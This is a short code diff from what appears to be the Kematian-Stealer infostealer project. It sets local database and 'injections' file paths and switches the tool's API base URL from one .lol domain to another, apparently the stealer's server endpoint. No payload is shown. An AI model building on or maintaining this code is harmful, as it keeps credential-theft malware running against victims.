@@ -46,7 +46,7 @@ db_path_graphs = os.path.join(good_dir, "Kematian-Stealer", "graphs.db")
 db_path_map = os.path.join(good_dir, "Kematian-Stealer", "map.db")
 db_path_injections = os.path.join(good_dir, "Kematian-Stealer", "injections.json")
 
-api_base_url = "https://sped.lol"
+api_base_url = "https://spedded.lol"
 
 identifier = str(uuid.uuid4())
 
